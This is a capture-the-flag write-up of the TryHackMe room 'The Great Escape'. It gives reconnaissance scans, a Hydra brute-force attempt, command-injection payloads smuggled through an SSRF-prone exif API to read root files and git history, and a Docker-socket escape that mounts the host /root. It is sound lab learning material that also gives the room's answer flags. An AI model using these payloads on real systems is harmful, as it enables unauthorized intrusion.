<h1 align="center">The Great Escape</h1>
<p align="center">2025, August 12<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>463</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Our devs have created an awesome new site. Can you break out of the sandbox?</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/a1df5e16-d984-4390-912c-64fc78843ba9"><br>
Access this CTF <a href="https://tryhackme.com/room/thegreatescape">here </a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/010918e4-8e54-4ad9-8700-c69bcf61cb21"></p>


<br>

<h2>Task 1 . Introduction</h2>
<p>If you're Stuck with the Docker Breakout part of this challenge, use the "Docker Rodeo" room to learn a wide variety of Docker vulnerabilities.</p>

<p><em>Answer the question below</em></p>

<p>1.1. Deploy the VM<br>
<code>No answer needed</code></p>

<br>
<br>
<h2>Task 2 . A Simple Webapp</h2>
<p>Start off with a simple webapp. Can you find the hidden flag?</p>

<p><em>Answer the question below</em></p>

<p>2.1. Find the flag hidden in the webapp<br>
<code>THM{b801135794bf1ed3a2aafaa44c2e5ad4}</code></p>

<br>

<img width="1903" height="376" alt="image" src="https://github.com/user-attachments/assets/36062c5f-06a0-422b-8ac4-015ccb918b52" />

<br>
<h3>Nmap</h3>

```bash
:~/TheGreatEscape# nmap -sV xx.xxx.xx.xxx
...
PORT     STATE    SERVICE
22/tcp open  ssh?
80/tcp open  http    nginx 1.19.6
```

<br>
<h3>Gobuster</h3>

```bash
:~/TheGreatEscape# gobuster dir -u http://xx.xxx.xxx.xxx/ -w /usr/share/wordlists/dirb/common.txt -e
...
Error: the server returns a status code that matches the provided options for non existing urls. http://xx.xxx.xxx.xxx/73ddf728-3e21-432c-b583-001831de6786 => 200 (Length: 3834). To continue please exclude the status code or the length
```

<br>
<h3>Researched</h3>
<p>

- https://en.wikipedia.org/wiki/Well-known_URI</p>

<br>

<img width="1075" height="562" alt="image" src="https://github.com/user-attachments/assets/fafada8d-4aa1-4aac-9ee3-52bc489b1497" />

<br>

```bash
:~/TheGreatEscape# dirb http://xxx.xxx.xxx.xxx/.wellknown -X .txt
```

<br>
<h3>/.wellknown/security.txt</h3>

<img width="1063" height="239" alt="image" src="https://github.com/user-attachments/assets/68464312-cbde-403a-9242-3356c94ff3be" />

<br>

```bash
Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/fl46 with a HEAD request for a nifty treat.
```

<br>
<h3>xx.xxx.xxxx.xxx/api/fl46</h3>

<br>
<br>

<img width="1058" height="462" alt="image" src="https://github.com/user-attachments/assets/453c6723-9948-475b-8aaa-40ed21af6400" />

<br>
<h3>xx.xxx.xxxx.xxx/login</h3>

<img width="1056" height="243" alt="image" src="https://github.com/user-attachments/assets/34ae42ee-715f-4bdc-a070-3eb5a5f56b34" />

<br>

<img width="1107" height="315" alt="image" src="https://github.com/user-attachments/assets/7c3b081f-1515-492d-aa00-225c006726c4" />

<br>

<br>
<h3>Hydra</h3>
<p>

- did not work  :-(
</p>

```bash
:~/TheGreatEscape# hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-post://xx.xxx.xxx.xxx/api/login/:{"username"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\:application/json:F=ERROR'
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-12 xx:xx:xx
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post://xx.xxx.xxx.xxx:80/api/login/:{"username"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\:application/json:F=ERROR
[STATUS] 16.00 tries/min, 16 tries in 00:01h, 14344382 to do in 14942:04h, 16 active
[STATUS] 5.33 tries/min, 16 tries in 00:03h, 14344382 to do in 44826:12h, 16 active
[STATUS] 2.29 tries/min, 16 tries in 00:07h, 14344382 to do in 104594:28h, 16 active
```


<br>
<h3xx.xxx.xxxx.xxx</h3>


<br>
<h3>xx.xxx.xxxx.xxx/api/</h3>

<img width="1057" height="92" alt="image" src="https://github.com/user-attachments/assets/11e84ae1-cd50-402f-af6a-01b57412c48c" />

<br>
<h3>xx.xxx.xxxx.xxx/robots.txt</h3>

<img width="1056" height="298" alt="image" src="https://github.com/user-attachments/assets/fd23590f-9f3c-4f43-8e2d-a90acc2a64ad" />

<br>

```bash
User-agent: *
Allow: /
Disallow: /api/
# Disallow: /exif-util
Disallow: /*.bak.txt$
```

<br>

<img width="1067" height="249" alt="image" src="https://github.com/user-attachments/assets/da2b7a77-8f6f-4ee4-973d-602dbde284cf" />

<br>

```bash
const response = await this.$axios.$get('http://api-dev-backup:8080/exif'
```

<br>
<p>

- uid=0(root) gid=0(root) groups=0(root)</p>

<br>

```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;id'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
uid=0(root) gid=0(root) groups=0(root)
```

<br>
<p>

- dev-note.txt</p>

<br>

```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;ls%20/root'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
dev-note.txt
```

<br>
<p>

- .git<br>
- dev-note.txt</p>

<br>

```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;ls%20-lah%20/root/'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
total 28K
drwx------ 1 root root 4.0K Jan  7  2021 .
drwxr-xr-x 1 root root 4.0K Jan  7  2021 ..
lrwxrwxrwx 1 root root    9 Jan  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 1 root root 4.0K Jan  7  2021 .git
-rw-r--r-- 1 root root   53 Jan  6  2021 .gitconfig
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-rw-r-- 1 root root  201 Jan  7  2021 dev-note.txt
```

<br>
<p>

- fluffybunnies123<br>
- Hydra</p>

<br>

```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;cat%20/root/dev-note.txt'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is fluffybunnies123

Cheers,

Hydra
```

<br>
<p>

- HEAD</p>

<br>

```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;ls%20-lah%20/root/.git'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
total 52K
drwxr-xr-x 1 root root 4.0K Jan  7  2021 .
drwx------ 1 root root 4.0K Jan  7  2021 ..
-rw-r--r-- 1 root root   19 Jan  7  2021 COMMIT_EDITMSG
-rw-r--r-- 1 root root   23 Jan  6  2021 HEAD
drwxr-xr-x 2 root root 4.0K Jan  6  2021 branches
-rw-r--r-- 1 root root   92 Jan  6  2021 config
-rw-r--r-- 1 root root   73 Jan  6  2021 description
drwxr-xr-x 2 root root 4.0K Jan  6  2021 hooks
-rw-r--r-- 1 root root  145 Jan  7  2021 index
drwxr-xr-x 2 root root 4.0K Jan  6  2021 info
drwxr-xr-x 1 root root 4.0K Jan  6  2021 logs
drwxr-xr-x 1 root root 4.0K Jan  7  2021 objects
drwxr-xr-x 1 root root 4.0K Jan  6  2021 refs
```

<br>
<p>

- a3d30a7d0********5ff9316e3fb84434916dee8</p>

<br>

```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;cat%20/root/.git/logs/HEAD'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
0000000000000000000000000000000000000000 a3d30a7d0********5ff9316e3fb84434916dee8 Hydra <hydragyrum@example.com> 1609966299 +0000	commit (initial): Added the flag and dev notes
a3d30a7d0********5ff9316e3fb84434916dee8 4530ff7f56b215fa9fe76c4d7cc1319960c4e539 Hydra <hydragyrum@example.com> 1609966299 +0000	commit: Removed the flag and original dev note b/c Security
4530ff7f56b215fa9fe76c4d7cc1319960c4e539 5242825dfd6b96819f65d17a1c31a99fea4ffb6a Hydra <hydragyrum@example.com> 1610038138 +0000	commit: fixed the dev note
```

<br>
<p>

- a3d30a7d0********5ff9316e3fb84434916dee8<BR>
- Hydra, hydragyrum@example.com</p>

<br>

```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;git%20-C%20/root%20log'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0********5ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
```

<br>
<p>

- hydragyrum@example.com<br>
- Hydra</p>

<br>


```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;cat%20-v%20/root/.gitconfig'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
[user]
	email = hydragyrum@example.com
	name = Hydra
```

<br>
<p>

- Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.<br>
- THM{********************454b75a10876}</p>

<br>

```bash
:~/TheGreatEscape# curl 'http://xx.xxx.xx.xxx/api/exif?url=http://api-dev-backup:8080/exif?url=;git%20-C%20/root%20show%20a3d30a7d0********5ff9316e3fb84434916dee8'
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
commit a3d30a7d0********5ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes

diff --git a/dev-note.txt b/dev-note.txt
new file mode 100644
index 0000000..89dcd01
--- /dev/null
+++ b/dev-note.txt
@@ -0,0 +1,9 @@
+Hey guys,
+
+I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+
+Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+
+Cheers,
+
+Hydra
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
new file mode 100644
index 0000000..aae8129
--- /dev/null
+++ b/flag.txt
@@ -0,0 +1,3 @@
+You found the root flag, or did you?
+
+THM{********************454b75a10876}
\ No newline at end of file
```

<br>

<p><em>Answer the question below</em></p>

<p>3.1. Find the root flag?<br>
<code>THM{********************454b75a10876}</code></p>

<br>
<br>
<h2>Task 4 . The Great Escape</h2>
<p>You thought you had root. But the root on a docker container isn't all that helpful. Find the secret flag</p>

<br>

```bash
:~/TheGreatEscape# ./e.sh
curl: (7) Failed to connect to xx.xxx.xx.xxx port 42: Connection refused
curl: (7) Failed to connect to xx.xxx.xx.xxx port 1337: Connection refused
curl: (7) Failed to connect to xx.xxx.xx.xxx port 10420: Connection refused
curl: (7) Failed to connect to xx.xxx.xx.xxx port 6969: Connection refused
curl: (7) Failed to connect to xx.xxx.xx.xxx port 63000: Connection refused
```

<br>

```bash
:~/TheGreatEscape# nmap -p 2375 xx.xxx.xx.xxx
...
PORT     STATE SERVICE
2375/tcp open  docker
```

<br>

```bash
:~/TheGreatEscape# docker -H xx.xxx.xx.xxx:2375 images
REPOSITORY                                    TAG                 IMAGE ID            CREATED             SIZE
exif-api-dev                                  latest              4084cb55e1c7        4 years ago         214MB
exif-api                                      latest              923c5821b907        4 years ago         163MB
frontend                                      latest              577f9da1362e        4 years ago         138MB
endlessh                                      latest              7bde5182dc5e        4 years ago         5.67MB
nginx                                         latest              ae2feff98a0c        4 years ago         133MB
debian                                        10-slim             4a9cd57610d6        4 years ago         69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3                 7331d26c1fdf        4 years ago         103MB
alpine                                        3.9                 78a2ce922f86        5 years ago         5.55MB
```

<br>

```bash
:~/TheGreatEscape# docker -H xx.xxx.xx.xxx:2375 run -it --rm -v /root:/mnt/root alpine:3.9
/ # whoami
root
/ # cd /mnt/root
/mnt/root # ls
flag.txt
/mnt/root # cat flag.txt
Congrats, you found the real flag!

THM{********************1315a32d734}
/mnt/root # 
```

<br>

<p><em>Answer the question below</em></p>

<p>4.1. What is the root flag? (root.txt)<br>
<code>THM{********************1315a32d734}</code></p>

<br>
<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/7b744977-25b1-4ec1-935a-7dfafa7c3f36"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/dddc05cb-18b2-4385-bd32-38c8e5326481"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 12   |   463    |     127ᵗʰ    |      5ᵗʰ     |     347ᵗʰ   |     8ᵗʰ    | 120,746  |    912    |    73     |


</div>

<p align="center">Global All Time:   127ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/f796a9bf-c629-461f-98e8-2c8a0790dd51"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/6afa43ee-df23-434c-b451-f2f81b6de7c5"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/72bd6cc0-6ec6-4c72-8548-718479992d65"><br>
                  Global monthly:    347ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/0efaaca3-06b7-4653-b518-410f3a9fb509"><br>
                  Brazil monthly:      8ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b2bc2ec8-e9cd-4a03-9887-bd0dedb2397b"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
